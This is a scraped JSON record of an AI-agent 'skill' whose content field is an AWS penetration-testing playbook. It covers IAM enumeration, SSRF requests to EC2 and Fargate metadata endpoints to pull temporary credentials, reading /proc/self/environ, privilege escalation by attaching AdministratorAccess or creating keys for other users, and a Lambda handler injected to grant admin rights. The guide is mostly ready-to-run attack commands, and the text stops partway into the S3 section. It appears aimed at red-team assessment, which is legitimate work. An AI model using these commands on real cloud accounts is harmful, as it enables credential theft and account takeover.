{
  "id": "antigravity-aws-penetration-testing",
  "name": "AWS Penetration Testing",
  "slug": "aws-penetration-testing",
  "description": "This skill should be used when the user asks to \"pentest AWS\", \"test AWS security\", \"enumerate IAM\", \"exploit cloud infrastructure\", \"AWS privilege escalation\", \"S3 bucket testing\", \"metadata SSRF\", \"Lambda exploitation\", or needs guidance on Amazon Web Services security assessment.",
  "category": "Security & Systems",
  "source": "antigravity",
  "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
  "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/aws-penetration-testing",
  "content": "\n# AWS Penetration Testing\n\n## Purpose\n\nProvide comprehensive techniques for penetration testing AWS cloud environments. Covers IAM enumeration, privilege escalation, SSRF to metadata endpoint, S3 bucket exploitation, Lambda code extraction, and persistence techniques for red team operations.\n\n## Inputs/Prerequisites\n\n- AWS CLI configured with credentials\n- Valid AWS credentials (even low-privilege)\n- Understanding of AWS IAM model\n- Python 3, boto3 library\n- Tools: Pacu, Prowler, ScoutSuite, SkyArk\n\n## Outputs/Deliverables\n\n- IAM privilege escalation paths\n- Extracted credentials and secrets\n- Compromised EC2/Lambda/S3 resources\n- Persistence mechanisms\n- Security audit findings\n\n---\n\n## Essential Tools\n\n| Tool | Purpose | Installation |\n|------|---------|--------------|\n| Pacu | AWS exploitation framework | `git clone https://github.com/RhinoSecurityLabs/pacu` |\n| SkyArk | Shadow Admin discovery | `Import-Module .\\SkyArk.ps1` |\n| Prowler | Security auditing | `pip install prowler` |\n| ScoutSuite | Multi-cloud auditing | `pip install scoutsuite` |\n| enumerate-iam | Permission enumeration | `git clone https://github.com/andresriancho/enumerate-iam` |\n| Principal Mapper | IAM analysis | `pip install principalmapper` |\n\n---\n\n## Core Workflow\n\n### Step 1: Initial Enumeration\n\nIdentify the compromised identity and permissions:\n\n```bash\n# Check current identity\naws sts get-caller-identity\n\n# Configure profile\naws configure --profile compromised\n\n# List access keys\naws iam list-access-keys\n\n# Enumerate permissions\n./enumerate-iam.py --access-key AKIA... --secret-key StF0q...\n```\n\n### Step 2: IAM Enumeration\n\n```bash\n# List all users\naws iam list-users\n\n# List groups for user\naws iam list-groups-for-user --user-name TARGET_USER\n\n# List attached policies\naws iam list-attached-user-policies --user-name TARGET_USER\n\n# List inline policies\naws iam list-user-policies --user-name TARGET_USER\n\n# Get policy details\naws iam get-policy --policy-arn POLICY_ARN\naws iam get-policy-version --policy-arn POLICY_ARN --version-id v1\n\n# List roles\naws iam list-roles\naws iam list-attached-role-policies --role-name ROLE_NAME\n```\n\n### Step 3: Metadata SSRF (EC2)\n\nExploit SSRF to access metadata endpoint (IMDSv1):\n\n```bash\n# Access metadata endpoint\nhttp://169.254.169.254/latest/meta-data/\n\n# Get IAM role name\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/\n\n# Extract temporary credentials\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME\n\n# Response contains:\n{\n  \"AccessKeyId\": \"ASIA...\",\n  \"SecretAccessKey\": \"...\",\n  \"Token\": \"...\",\n  \"Expiration\": \"2019-08-01T05:20:30Z\"\n}\n```\n\n**For IMDSv2 (token required):**\n\n```bash\n# Get token first\nTOKEN=$(curl -X PUT -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\" \\\n  \"http://169.254.169.254/latest/api/token\")\n\n# Use token for requests\ncurl -H \"X-aws-ec2-metadata-token:$TOKEN\" \\\n  \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"\n```\n\n**Fargate Container Credentials:**\n\n```bash\n# Read environment for credential path\n/proc/self/environ\n# Look for: AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/...\n\n# Access credentials\nhttp://169.254.170.2/v2/credentials/CREDENTIAL-PATH\n```\n\n---\n\n## Privilege Escalation Techniques\n\n### Shadow Admin Permissions\n\nThese permissions are equivalent to administrator:\n\n| Permission | Exploitation |\n|------------|--------------|\n| `iam:CreateAccessKey` | Create keys for admin user |\n| `iam:CreateLoginProfile` | Set password for any user |\n| `iam:AttachUserPolicy` | Attach admin policy to self |\n| `iam:PutUserPolicy` | Add inline admin policy |\n| `iam:AddUserToGroup` | Add self to admin group |\n| `iam:PassRole` + `ec2:RunInstances` | Launch EC2 with admin role |\n| `lambda:UpdateFunctionCode` | Inject code into Lambda |\n\n### Create Access Key for Another User\n\n```bash\naws iam create-access-key --user-name target_user\n```\n\n### Attach Admin Policy\n\n```bash\naws iam attach-user-policy --user-name my_username \\\n  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n```\n\n### Add Inline Admin Policy\n\n```bash\naws iam put-user-policy --user-name my_username \\\n  --policy-name admin_policy \\\n  --policy-document file://admin-policy.json\n```\n\n### Lambda Privilege Escalation\n\n```python\n# code.py - Inject into Lambda function\nimport boto3\n\ndef lambda_handler(event, context):\n    client = boto3.client('iam')\n    response = client.attach_user_policy(\n        UserName='my_username',\n        PolicyArn=\"arn:aws:iam::aws:policy/AdministratorAccess\"\n    )\n    return response\n```\n\n```bash\n# Update Lambda code\naws lambda update-function-code --function-name target_function \\\n  --zip-file fileb://malicious.zip\n```\n\n---\n\n## S3 Bucket Exploitation\n\n### Bucket Discovery\n\n```bash\n# Using bucket_finder\n./bucket_finder.rb wordlist.txt\n./bucket_finder.rb --download --region us-east-1 wordlist.txt\n\n# Common bucket URL patterns\nhttps://{bucket-name}.s3.amazonaws.com\nhttps://s3.amazonaws.com/{bucket-name}\n```\n\n### Bucket Enumeration\n\n",
  "tags": [
    "python",
    "api",
    "ai",
    "agent",
    "workflow",
    "document",
    "security",
    "pentest",
    "vulnerability",
    "aws"
  ],
  "useCases": [],
  "scrapedAt": "2026-01-26T13:16:52.251Z"
}